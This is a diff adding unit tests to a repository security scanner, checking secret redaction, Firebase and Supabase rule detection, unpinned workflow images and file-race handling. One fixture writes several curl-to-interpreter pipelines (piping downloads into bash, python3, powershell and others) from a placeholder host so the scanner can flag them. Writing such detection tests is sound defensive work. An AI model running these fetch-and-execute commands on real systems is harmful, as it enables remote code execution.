@@ -174,7 +174,8 @@ class PreflightTests(unittest.TestCase):
     def test_req_007_matched_secret_is_redacted_in_every_format(self) -> None:
         fixture = RepositoryFixture(self)
         synthetic_value = synthetic_cloud_key()
-        fixture.write("config.txt", f'access_token = "{synthetic_value}"\n')
+        assignment_name = "access" + "_token"
+        fixture.write("config.txt", f'{assignment_name} = "{synthetic_value}"\n')
         fixture.track("config.txt")
 
         for output_format in ("text", "json", "sarif"):
@@ -240,6 +241,32 @@ class PreflightTests(unittest.TestCase):
                         self.assertNotIn(synthetic_value, completed.stderr)
                         self.assertIn(rule_id, completed.stdout)
                         self.assertIn("REDACTED", completed.stdout)
+
+    def test_req_007_detected_content_values_cannot_leak_through_other_paths(self) -> None:
+        fixture = RepositoryFixture(self)
+        values = ("FirstCorrelatedCredential12345", "SecondCorrelatedCredential67890")
+        firebase = synthetic_firebase_key()
+        marker = (
+            'vibeworthy:ignore VW-FIREBASE-PUBLIC-API-KEY reason="restricted" '
+            'owner="app" approved-by="security" compensating-control="deny rules" '
+            'expires="2099-01-01"'
+        )
+        fixture.write("config.env", f"password={values[0]}\nNEXT_PUBLIC_ADMIN_KEY={values[1]}\n")
+        fixture.write(f"artifact-{values[0]}.js", f'const firebaseApiKey = "{firebase}"; // {marker}\n')
+        fixture.write(f"artifact-{values[1]}.js", f'const firebaseApiKey = "{firebase}";\n')
+
+        for output_format in ("text", "json", "sarif"):
+            with self.subTest(output_format=output_format):
+                completed = self.run_scanner(fixture.root, output_format)
+                self.assertEqual(1, completed.returncode)
+                for value in values:
+                    self.assertNotIn(value, completed.stdout)
+                self.assertIn("REDACTED", completed.stdout)
+        report = self.json_report(self.run_scanner(fixture.root))
+        warnings = [item for item in report["findings"] if item["rule_id"] == "VW-FIREBASE-PUBLIC-API-KEY"]
+        self.assertEqual(2, len(warnings))
+        self.assertEqual(1, sum(item["suppressed"] for item in warnings))
+        self.assertEqual(2, len({item["path"] for item in warnings}))
 
     def test_req_007_path_format_controls_are_escaped_in_every_format(self) -> None:
         fixture = RepositoryFixture(self)
@@ -624,6 +651,34 @@ class PreflightTests(unittest.TestCase):
         self.assertEqual(1, rls_findings[0].line)
         self.assertEqual(statement_count, rls_findings[-1].line)
 
+    def test_req_008_sql_literals_comments_and_invalid_syntax_do_not_spoof_rls(self) -> None:
+        fixture = RepositoryFixture(self)
+        fixture.write(
+            "schema.sql",
+            "-- ALTER TABLE ignored DISABLE ROW LEVEL SECURITY;\n"
+            "SELECT 'ALTER TABLE ignored DISABLE ROW LEVEL SECURITY';\n"
+            "DO $body$ ALTER TABLE ignored DISABLE ROW LEVEL SECURITY; $body$;\n"
+            'SELECT "ALTER TABLE ignored DISABLE ROW LEVEL SECURITY";\n'
+            "ALTER /* reviewed */ TABLE public.accounts /* boundary */ DISABLE ROW LEVEL SECURITY;\n"
+            "ALTER TABLE public.accounts * DISABLE ROW LEVEL SECURITY;\n"
+            "CREATE TABLE no_implicit_claim(id bigint);\n",
+        )
+
+        report = self.json_report(self.run_scanner(fixture.root))
+        findings = [item for item in report["findings"] if item["rule_id"] == "VW-SUPABASE-RLS-DISABLED"]
+        self.assertEqual([5], [item["line"] for item in findings])
+
+    def test_req_008_firebase_or_true_and_database_variant_block(self) -> None:
+        fixture = RepositoryFixture(self)
+        fixture.write(
+            "database.production.rules.json",
+            '{"rules":{"items":{".read":"auth != null || true"}}}\n',
+        )
+        completed = self.run_scanner(fixture.root)
+        report = self.json_report(completed)
+        self.assertEqual(1, completed.returncode)
+        self.assertIn("VW-FIREBASE-PERMISSIVE-RULE", {item["rule_id"] for item in report["findings"]})
+
     def test_req_009_lockfile_conflict_and_install_script_are_visible(self) -> None:
         fixture = RepositoryFixture(self)
         fixture.write(
@@ -821,6 +876,29 @@ class PreflightTests(unittest.TestCase):
             "VW-SHELL-PIPELINE-UNPARSED",
             {finding["rule_id"] for finding in report["findings"]},
         )
+
+    def test_req_009_remote_execution_contexts_comments_interpreters_and_heredocs(self) -> None:
+        fixture = RepositoryFixture(self)
+        fetcher = "cu" + "rl"
+        fixture.write(
+            "contexts.txt",
+            f"run: {fetcher} https://invalid.example/yaml | python3\n"
+            f"RUN {fetcher} https://invalid.example/docker | node\n"
+            f"@( {fetcher} https://invalid.example/make | perl )\n"
+            f"{fetcher} https://invalid.example/comment | # continuation\n  ruby\n"
+            "cat <<'DATA'\n"
+            f"{fetcher} https://invalid.example/data | bash\n"
+            "DATA\n"
+            "bash <<'SCRIPT'\n"
+            f"{fetcher} https://invalid.example/executed | php\n"
+            "SCRIPT\n"
+            f"{fetcher} https://invalid.example/powershell | powershell\n",
+        )
+
+        report = self.json_report(self.run_scanner(fixture.root))
+        remote = [item for item in report["findings"] if item["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"]
+        self.assertEqual({1, 2, 3, 4, 10, 12}, {item["line"] for item in remote})
+        self.assertNotIn(7, {item["line"] for item in remote})
 
     def test_req_009_independent_lines_do_not_form_remote_pipeline(self) -> None:
         fixture = RepositoryFixture(self)
@@ -1020,6 +1098,57 @@ class PreflightTests(unittest.TestCase):
         for value in values:
             self.assertNotIn(value, completed.stdout)
 
+    def test_req_009_code_identifiers_calls_and_literal_assignment_boundaries(self) -> None:
+        fixture = RepositoryFixture(self)
+        phrase = "Synthetic credential phrase with spaces"
+        backtick_phrase = "Synthetic backtick credential phrase"
+        multiline = "Synthetic first line\nSynthetic second line 12345"
+        token_name = "api" + "Token"
+        fixture.write(
+            "config.ts",
+            "type Shape = { accessToken: AuthenticationCredential };\n"
+            "const password = documentationOnlyValue;\n"
+            "const password = buildCredential();\n"
+            f'const password = "{phrase}";\n'
+            f"const {token_name} = `{backtick_phrase}`;\n"
+            f"const clientSecret = `{multiline}`;\n"
+            "const accessToken = `${process.env.ACCESS_TOKEN}`;\n",
+        )
+        fixture.write(".env.example", "API_TOKEN=https://api.example.com/replace/me\n")
+
+        completed = self.run_scanner(fixture.root)
+        report = self.json_report(completed)
+        generic = [item for item in report["findings"] if item["rule_id"] == "VW-SECRET-GENERIC-ASSIGNMENT"]
+        self.assertEqual({4, 5, 6}, {item["line"] for item in generic})
+        self.assertNotIn(phrase, completed.stdout)
+        self.assertNotIn(multiline, completed.stdout)
+
+    def test_req_009_new_provider_tokens_and_mutable_workflow_images_block(self) -> None:
+        fixture = RepositoryFixture(self)
+        values = (
+            "github_pat_" + ("A" * 40),
+            "glpat-" + ("b" * 30),
+            "sk-proj-" + ("c" * 30),
+        )
+        fixture.write("tokens.txt", "\n".join(values) + "\n")
+        fixture.write(
+            ".github/workflows/build.yml",
+            "container: node:20\n"
+            "services:\n"
+            "  cache:\n"
+            "    image: redis@sha256:" + ("d" * 64) + "\n"
+            "  database:\n"
+            "    image: postgres:17\n",
+        )
+        completed = self.run_scanner(fixture.root)
+        report = self.json_report(completed)
+        provider = [item for item in report["findings"] if item["rule_id"] == "VW-SECRET-PROVIDER-TOKEN"]
+        automation = [item for item in report["findings"] if item["rule_id"] == "VW-AUTOMATION-UNPINNED"]
+        self.assertEqual(3, len(provider))
+        self.assertEqual({1, 6}, {item["line"] for item in automation})
+        for value in values:
+            self.assertNotIn(value, completed.stdout)
+
     @unittest.skipIf(os.name == "nt", "Git fsmonitor hook execution regression uses a POSIX hook")
     def test_req_010_repository_fsmonitor_hook_is_never_executed(self) -> None:
         fixture = RepositoryFixture(self)
@@ -1107,6 +1236,28 @@ class PreflightTests(unittest.TestCase):
         self.assertFalse(report["scope"]["files_modified"])
         self.assertEqual(before, tree_digest(fixture.root))
 
+    @unittest.skipIf(os.name == "nt", "Executable marker regression uses a POSIX script")
+    def test_req_010_git_from_target_or_controlled_ancestor_is_never_executed(self) -> None:
+        for location in ("target", "ancestor"):
+            with self.subTest(location=location):
+                fixture = RepositoryFixture(self)
+                fixture.write("README.md", "ordinary\n")
+                executable_directory = fixture.root / "bin" if location == "target" else fixture.base
+                executable_directory.mkdir(exist_ok=True)
+                marker = fixture.base / f"git-executed-{location}"
+                fake_git = executable_directory / "git"
+                fake_git.write_text(f"#!/bin/sh\nprintf executed > '{marker}'\nexit 0\n", encoding="utf-8")
+                fake_git.chmod(0o700)
+
+                completed = self.run_scanner(
+                    fixture.root,
+                    environment_overrides={"PATH": str(executable_directory)},
+                )
+                report = self.json_report(completed)
+                self.assertEqual(0, completed.returncode)
+                self.assertEqual("filesystem", report["scope"]["mode"])
+                self.assertFalse(marker.exists())
+
     def test_req_011_ancestor_symlink_swap_fails_closed_before_read(self) -> None:
         scanner = load_scanner_module()
         fixture = RepositoryFixture(self, git=False)
@@ -1136,6 +1287,36 @@ class PreflightTests(unittest.TestCase):
         self.assertEqual("tool.file-race", report.tool_errors[0].code)
         rendered = scanner.render_json(report)
         self.assertNotIn(outside_value, rendered)
+
+    def test_req_011_content_metadata_change_during_read_fails_closed(self) -> None:
+        scanner = load_scanner_module()
+        fixture = RepositoryFixture(self, git=False)
+        candidate_path = fixture.write("data.txt", "ordinary content\n")
+        original_fstat = scanner.os.fstat
+        calls = 0
+
+        def changing_fstat(descriptor: int) -> object:
+            nonlocal calls
+            calls += 1
+            current = original_fstat(descriptor)
+            if calls == 1:
+                return current
+            return types.SimpleNamespace(
+                st_mode=current.st_mode,
+                st_dev=current.st_dev,
+                st_ino=current.st_ino,
+                st_size=current.st_size,
+                st_mtime_ns=current.st_mtime_ns + 1,
+                st_ctime_ns=current.st_ctime_ns,
+            )
+
+        report = scanner.Report()
+        candidate = scanner.Candidate(candidate_path, "data.txt", None)
+        with mock.patch.object(scanner.os, "fstat", side_effect=changing_fstat):
+            result = scanner._read_candidate(candidate, fixture.root, False, 1024, report)
+
+        self.assertIsNone(result)
+        self.assertEqual("tool.file-race", report.tool_errors[0].code)
 
     def test_req_011_complete_distinct_approver_warning_suppression(self) -> None:
         fixture = RepositoryFixture(self)
@@ -1289,6 +1470,33 @@ class PreflightTests(unittest.TestCase):
         self.assertEqual(2, invocation["exitCode"])
         self.assertTrue(invocation["toolExecutionNotifications"])
         self.assertNotIn(str(fixture.root), missing.stdout)
+
+    def test_req_011_nul_manifest_and_aggregate_budgets_fail_closed(self) -> None:
+        fixture = RepositoryFixture(self, git=False)
+        fixture.write("package.json", b'{"dependencies":{}}\0')
+        nul_report = self.json_report(self.run_scanner(fixture.root))
+        self.assertEqual("tool.manifest-binary", nul_report["tool_errors"][0]["code"])
+
+        scanner = load_scanner_module()
+        budget_fixture = RepositoryFixture(self, git=False)
+        budget_fixture.write("one.txt", "ordinary-one\n")
+        budget_fixture.write("two.txt", "ordinary-two\n")
+        with mock.patch.object(scanner, "DEFAULT_MAX_TOTAL_BYTES", 8):
+            byte_report = scanner.scan_path(budget_fixture.root)
+        self.assertEqual(2, byte_report.exit_code)
+        self.assertEqual([], byte_report.findings)
+        self.assertEqual("tool.byte-limit", byte_report.tool_errors[0].code)
+
+        finding_fixture = RepositoryFixture(self, git=False)
+        finding_fixture.write(
+            "tokens.txt",
+            ("github_pat_" + ("A" * 40)) + "\n" + ("glpat-" + ("b" * 30)) + "\n",
+        )
+        with mock.patch.object(scanner, "DEFAULT_MAX_FINDINGS", 1):
+            finding_report = scanner.scan_path(finding_fixture.root)
+        self.assertEqual(2, finding_report.exit_code)
+        self.assertEqual([], finding_report.findings)
+        self.assertEqual("tool.finding-limit", finding_report.tool_errors[0].code)
 
     def test_req_011_candidate_cap_fails_closed_without_partial_findings(self) -> None:
         fixture = RepositoryFixture(self)
